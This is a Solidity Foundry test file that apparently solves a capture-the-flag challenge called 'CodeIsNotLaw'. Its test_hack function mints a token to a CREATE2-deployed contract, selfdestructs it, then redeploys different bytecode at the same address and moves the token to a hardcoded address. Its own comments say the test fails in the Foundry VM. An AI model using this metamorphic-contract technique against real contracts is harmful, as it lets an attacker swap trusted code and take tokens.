// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.19 <0.9.0;

import { PRBTest } from "@prb/test/PRBTest.sol";
import { console2 } from "forge-std/console2.sol";
import { StdCheats } from "forge-std/StdCheats.sol";
import "../src/CodeIsNotLaw.sol";
import "../src/Create2Factory.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

/// @dev See the "Writing Tests" section in the Foundry Book if this is your first time with Forge.
/// https://book.getfoundry.sh/forge/writing-tests
contract FooTest is PRBTest, StdCheats {
    CodeIsNotLaw public CodeIsNotLawContract;
    Create2Factory public factoryContract;
    ModifiedContract public modifiedContract;

    function setUp() public {
        vm.roll(1);
        CodeIsNotLawContract = new CodeIsNotLaw();
        factoryContract = new Create2Factory();
    }

    /// @dev Simple test. Run Forge with `-vvvv` to see console logs.

    //This test doesnt work in the foundry VM, the contract isnt selfdestructed even if the subsequent transactions
    //are set in the next block.
    function test_hack() external {
        //deploy contract with initial bytecode and mint 1 ERC20, assert its correctly minted
        address contract1 = factoryContract.whatDoesThisDo(1);
        CodeIsNotLawContract.mint(contract1);
        uint256 balanceContract1 = CodeIsNotLawContract.balanceOf(contract1);
        assertEq(balanceContract1, 1);
        //selfdestruct initial implementation, assert codehash is 0(has been succesfully destroyed)
        modifiedContract = ModifiedContract(contract1);
        modifiedContract.bye();

        //failing test here: doesnt self destruct contract.
        bytes32 codehashContract1 = CodeIsNotLawContract.getContractCodeHash(contract1);
        assertEq(codehashContract1, 0x0000000000000000000000000000000000000000000000000000000000000000);
        //Change implementation that is going to be deployed on the next CREATE2
        //To do so we change the bool of the Create2Factory originalImplementation
        factoryContract.dontCopyMySolution();
        //Redeploy with different bytecode and assert its the same address
        address contract2 = factoryContract.whatDoesThisDo(1);
        assertEq(contract1, contract2);
        //transfer the tokens from the new implementation to my address
        modifiedContract.YouMustBeWonderingWhatTheFuckDoesThisDo("Lol", true, address(CodeIsNotLawContract));
        uint256 myBalance = CodeIsNotLawContract.balanceOf(0x1825d3eB7763e144172abeb92fDcfdD5D1BF6e4C);
        assertEq(myBalance, 1);
    }

    /// @dev Test that fuzzes an unsigned integer.
}
